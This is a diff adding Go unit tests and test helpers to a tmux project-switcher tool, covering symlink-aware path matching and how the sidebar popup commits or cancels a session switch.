@@ -2574,6 +3656,18 @@ func (e *capturingSwitchSessionExecutor) AuthorizeProjectHooks(_ context.Context
 	}
 	if e.authorizeSet {
 		return e.authorizeResult, nil
+	}
+	return true, nil
+}
+
+func (e *capturingSwitchSessionExecutor) AuthorizeProjectLayout(_ context.Context, _ string, artifact corelayout.Artifact) (bool, error) {
+	e.layoutAuthorizeCalled = true
+	e.calls = append(e.calls, "authorize-layout:"+artifact.RelativePath)
+	if e.layoutAuthorizeErr != nil {
+		return false, e.layoutAuthorizeErr
+	}
+	if e.layoutAuthorizeSet {
+		return e.layoutAuthorizeResult, nil
 	}
 	return true, nil
 }
@@ -2602,6 +3696,49 @@ func (e *capturingSwitchSessionExecutor) RecentSessions(context.Context) ([]stri
 		return nil, e.recentErr
 	}
 	return e.recentSessions, nil
+}
+
+func sortedStrings(values []string) []string {
+	values = append([]string(nil), values...)
+	slices.Sort(values)
+	return values
+}
+
+func pickerItemValues(items []intpicker.Item) []string {
+	values := make([]string, 0, len(items))
+	for _, item := range items {
+		values = append(values, item.Value)
+	}
+	return values
+}
+
+func pickerItemSearchTexts(items []intpicker.Item) []string {
+	values := make([]string, 0, len(items))
+	for _, item := range items {
+		values = append(values, item.SearchText)
+	}
+	return values
+}
+
+func expectedCheapSidebarEntry(name, displayPath, value string, pinned bool) intpickercompat.Entry {
+	return expectedSidebarEntry(name, displayPath, value, "new", pinned)
+}
+
+func expectedSidebarEntry(name, displayPath, value, modeLabel string, pinned bool) intpickercompat.Entry {
+	row := intrender.BuildSwitchRows([]intrender.SwitchCandidate{{
+		Path:        value,
+		DisplayPath: displayPath,
+		DisplayName: name,
+		SessionName: name,
+		ModeLabel:   modeLabel,
+		UI:          "sidebar",
+		Pinned:      pinned,
+	}})[0]
+	return intpickercompat.Entry{
+		Label:     row.Item.EffectiveLabel(),
+		Value:     value,
+		SearchKey: name,
+	}
 }
 
 func saveSwitchProjectStartupSnapshot(t *testing.T, store sessionstate.Store, sessionName string) {
@@ -2790,4 +3927,294 @@ func (f switchFixtureFS) path(rel string) string {
 	f.t.Helper()
 
 	return filepath.Join(f.root, filepath.FromSlash(rel))
+}
+
+func TestBestSwitchCandidateMatchCrossesSymlinkForms(t *testing.T) {
+	t.Parallel()
+
+	tmp := t.TempDir()
+	realProj := filepath.Join(tmp, "real", "proj")
+	if err := os.MkdirAll(filepath.Join(realProj, "sub"), 0o755); err != nil {
+		t.Fatalf("MkdirAll(): %v", err)
+	}
+	linkRoot := filepath.Join(tmp, "link")
+	if err := os.Symlink(filepath.Join(tmp, "real"), linkRoot); err != nil {
+		t.Fatalf("Symlink(): %v", err)
+	}
+	symlinkProj := filepath.Join(linkRoot, "proj")
+
+	tests := []struct {
+		name       string
+		path       string
+		candidates []string
+		want       string
+	}{
+		{
+			name:       "session cwd via real path matches symlink candidate row",
+			path:       realProj,
+			candidates: []string{symlinkProj},
+			want:       symlinkProj,
+		},
+		{
+			name:       "session cwd via symlink matches real-path candidate row",
+			path:       symlinkProj,
+			candidates: []string{realProj},
+			want:       realProj,
+		},
+		{
+			name:       "nested real cwd prefix-matches symlink candidate, returns display form",
+			path:       filepath.Join(realProj, "sub"),
+			candidates: []string{symlinkProj},
+			want:       symlinkProj,
+		},
+		{
+			name:       "no match returns empty",
+			path:       filepath.Join(tmp, "elsewhere"),
+			candidates: []string{symlinkProj},
+			want:       "",
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := bestSwitchCandidateMatch(tc.path, tc.candidates); got != tc.want {
+				t.Fatalf("bestSwitchCandidateMatch(%q, %q) = %q, want %q", tc.path, tc.candidates, got, tc.want)
+			}
+		})
+	}
+}
+
+func TestBestSwitchCandidateMatchBrokenLinkFallsBackToLexical(t *testing.T) {
+	t.Parallel()
+
+	// Neither path exists on disk, so EvalSymlinks fails and CanonicalPath must
+	// fall back to lexical Clean without panicking, still matching by prefix.
+	base := filepath.Join(string(filepath.Separator), "no", "such", "root")
+	candidate := filepath.Join(base, "proj")
+	nested := filepath.Join(candidate, "deep")
+
+	if got := bestSwitchCandidateMatch(nested, []string{candidate}); got != candidate {
+		t.Fatalf("bestSwitchCandidateMatch(%q, %q) = %q, want %q", nested, candidate, got, candidate)
+	}
+	if got := bestSwitchCandidateMatch(candidate, []string{candidate}); got != candidate {
+		t.Fatalf("bestSwitchCandidateMatch(exact) = %q, want %q", got, candidate)
+	}
+	if got := bestSwitchCandidateMatch("", []string{candidate}); got != "" {
+		t.Fatalf("bestSwitchCandidateMatch(blank) = %q, want empty", got)
+	}
+}
+
+func TestSwitchCurrentSelectionMatchesSnappedSymlinkCandidate(t *testing.T) {
+	t.Parallel()
+
+	tmp := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(tmp, "real", "proj"), 0o755); err != nil {
+		t.Fatalf("MkdirAll(): %v", err)
+	}
+	linkRoot := filepath.Join(tmp, "link")
+	if err := os.Symlink(filepath.Join(tmp, "real"), linkRoot); err != nil {
+		t.Fatalf("Symlink(): %v", err)
+	}
+
+	// tmux reports the resolved real path as the active session cwd.
+	realCurrent := filepath.Join(tmp, "real", "proj")
+
+	got, err := candidates.Discover(candidates.Inputs{
+		ManagedRoots: []string{linkRoot},
+		CurrentPath:  realCurrent,
+	})
+	if err != nil {
+		t.Fatalf("Discover() error = %v", err)
+	}
+
+	symlinkProj := filepath.Join(linkRoot, "proj")
+	if !slices.Contains(got, symlinkProj) {
+		t.Fatalf("Discover() = %q, want symlink-form candidate %q", got, symlinkProj)
+	}
+	if slices.Contains(got, realCurrent) {
+		t.Fatalf("Discover() = %q leaked real-path candidate %q", got, realCurrent)
+	}
+
+	// The current-session highlight resolves the real-path cwd onto the single
+	// symlink-form candidate row produced by discovery.
+	if match := bestSwitchCandidateMatch(realCurrent, got); match != symlinkProj {
+		t.Fatalf("bestSwitchCandidateMatch(%q, %q) = %q, want %q", realCurrent, got, match, symlinkProj)
+	}
+}
+
+func TestSwitchSidebarCommitRecordsOnceAfterMarkerRemoval(t *testing.T) {
+	t.Setenv("TMPDIR", t.TempDir())
+
+	client := "/dev/pts/7"
+	marker := popupMarkerPath(sanitizePopupKey(client), "sessionizer-sidebar")
+	if err := os.WriteFile(marker, []byte("%1\norigin\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	runner := &recordingTmuxRunner{}
+	executor := &capturingSwitchSessionExecutor{exists: map[string]bool{"work-session": true}}
+	cmd := &switchCommand{
+		sessions:   executor,
+		tmuxRunner: runner,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+		lookupEnv: func(key string) string {
+			if key == inttmux.SwitchTargetClientEnv {
+				return client
+			}
+			return ""
+		},
+	}
+
+	plan := switchPlan{UI: switchUISidebar, Selection: "/repo/work", SessionName: "work-session"}
+	if err := cmd.openProjectTargetPathFromSidebar(context.Background(), plan); err != nil {
+		t.Fatalf("openProjectTargetPathFromSidebar() error = %v", err)
+	}
+
+	if got, want := executor.calls, []string{"open:work-session"}; !reflect.DeepEqual(got, want) {
+		t.Fatalf("session calls = %q, want %q", got, want)
+	}
+	if _, err := os.Stat(marker); !errors.Is(err, os.ErrNotExist) {
+		t.Fatalf("marker stat error = %v, want removed before commit record", err)
+	}
+	want := recordedTmuxCall{name: "tmux", args: []string{"run-shell", "-b", "'/tmp/projmux' 'window' 'record'"}}
+	if len(runner.calls) != 1 || !reflect.DeepEqual(runner.calls[0], want) {
+		t.Fatalf("tmux calls = %#v, want exactly one commit record %#v", runner.calls, want)
+	}
+}
+
+func TestSwitchSidebarCommitSkipsExplicitRecordWithoutMarker(t *testing.T) {
+	t.Setenv("TMPDIR", t.TempDir())
+
+	runner := &recordingTmuxRunner{}
+	executor := &capturingSwitchSessionExecutor{exists: map[string]bool{"work-session": true}}
+	cmd := &switchCommand{
+		sessions:   executor,
+		tmuxRunner: runner,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+		lookupEnv:  func(string) string { return "" },
+	}
+
+	plan := switchPlan{UI: switchUISidebar, Selection: "/repo/work", SessionName: "work-session"}
+	if err := cmd.openProjectTargetPathFromSidebar(context.Background(), plan); err != nil {
+		t.Fatalf("openProjectTargetPathFromSidebar() error = %v", err)
+	}
+
+	if got, want := executor.calls, []string{"open:work-session"}; !reflect.DeepEqual(got, want) {
+		t.Fatalf("session calls = %q, want %q", got, want)
+	}
+	// Outside a sidebar popup the open switch fires the session-changed hook
+	// itself, so an explicit record would double-record.
+	if len(runner.calls) != 0 {
+		t.Fatalf("tmux calls = %#v, want none without a sidebar popup marker", runner.calls)
+	}
+}
+
+func TestSwitchSidebarCancelRestoresOriginSession(t *testing.T) {
+	t.Setenv("TMPDIR", t.TempDir())
+
+	client := "/dev/pts/7"
+	marker := popupMarkerPath(sanitizePopupKey(client), "sessionizer-sidebar")
+	if err := os.WriteFile(marker, []byte("%1\norigin-session\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	executor := &capturingSwitchSessionExecutor{exists: map[string]bool{"origin-session": true}}
+	cmd := &switchCommand{
+		sessions: executor,
+		lookupEnv: func(key string) string {
+			if key == inttmux.SwitchTargetClientEnv {
+				return client
+			}
+			return ""
+		},
+	}
+
+	reopen, err := cmd.execute(context.Background(), switchPlan{UI: switchUISidebar, OriginSession: "origin-session"}, io.Discard)
+	if err != nil {
+		t.Fatalf("execute() error = %v", err)
+	}
+	if reopen {
+		t.Fatal("execute() reopen = true, want false on cancel")
+	}
+	if got, want := executor.calls, []string{"open:origin-session"}; !reflect.DeepEqual(got, want) {
+		t.Fatalf("session calls = %q, want origin restore %q", got, want)
+	}
+	if _, err := os.Stat(marker); !errors.Is(err, os.ErrNotExist) {
+		t.Fatalf("marker stat error = %v, want removed before origin restore", err)
+	}
+}
+
+func TestSwitchSidebarCancelSkipsRestoreWhenOriginMissing(t *testing.T) {
+	t.Setenv("TMPDIR", t.TempDir())
+
+	client := "/dev/pts/7"
+	marker := popupMarkerPath(sanitizePopupKey(client), "sessionizer-sidebar")
+	if err := os.WriteFile(marker, []byte("%1\norigin-session\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	executor := &capturingSwitchSessionExecutor{exists: map[string]bool{}}
+	cmd := &switchCommand{
+		sessions: executor,
+		lookupEnv: func(key string) string {
+			if key == inttmux.SwitchTargetClientEnv {
+				return client
+			}
+			return ""
+		},
+	}
+
+	if _, err := cmd.execute(context.Background(), switchPlan{UI: switchUISidebar, OriginSession: "origin-session"}, io.Discard); err != nil {
+		t.Fatalf("execute() error = %v", err)
+	}
+	if len(executor.calls) != 0 {
+		t.Fatalf("session calls = %q, want none when the origin session is gone", executor.calls)
+	}
+	if _, err := os.Stat(marker); !errors.Is(err, os.ErrNotExist) {
+		t.Fatalf("marker stat error = %v, want marker removed even without restore", err)
+	}
+}
+
+func TestSwitchSidebarCancelWithoutMarkerDoesNothing(t *testing.T) {
+	t.Setenv("TMPDIR", t.TempDir())
+
+	executor := &capturingSwitchSessionExecutor{exists: map[string]bool{"origin-session": true}}
+	cmd := &switchCommand{
+		sessions:  executor,
+		lookupEnv: func(string) string { return "" },
+	}
+
+	if _, err := cmd.execute(context.Background(), switchPlan{UI: switchUISidebar, OriginSession: "origin-session"}, io.Discard); err != nil {
+		t.Fatalf("execute() error = %v", err)
+	}
+	if len(executor.calls) != 0 {
+		t.Fatalf("session calls = %q, want none outside a sidebar popup", executor.calls)
+	}
+}
+
+func TestSwitchPopupCancelDoesNotRestoreOrigin(t *testing.T) {
+	t.Setenv("TMPDIR", t.TempDir())
+
+	client := "/dev/pts/7"
+	marker := popupMarkerPath(sanitizePopupKey(client), "sessionizer-sidebar")
+	if err := os.WriteFile(marker, []byte("%1\norigin-session\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	executor := &capturingSwitchSessionExecutor{exists: map[string]bool{"origin-session": true}}
+	cmd := &switchCommand{
+		sessions: executor,
+		lookupEnv: func(key string) string {
+			if key == inttmux.SwitchTargetClientEnv {
+				return client
+			}
+			return ""
+		},
+	}
+
+	if _, err := cmd.execute(context.Background(), switchPlan{UI: switchUIPopup, OriginSession: "origin-session"}, io.Discard); err != nil {
+		t.Fatalf("execute() error = %v", err)
+	}
+	if len(executor.calls) != 0 {
+		t.Fatalf("session calls = %q, want none for the popup sessionizer", executor.calls)
+	}
+	if _, err := os.Stat(marker); err != nil {
+		t.Fatalf("marker stat error = %v, want sidebar marker untouched by popup cancel", err)
+	}
 }
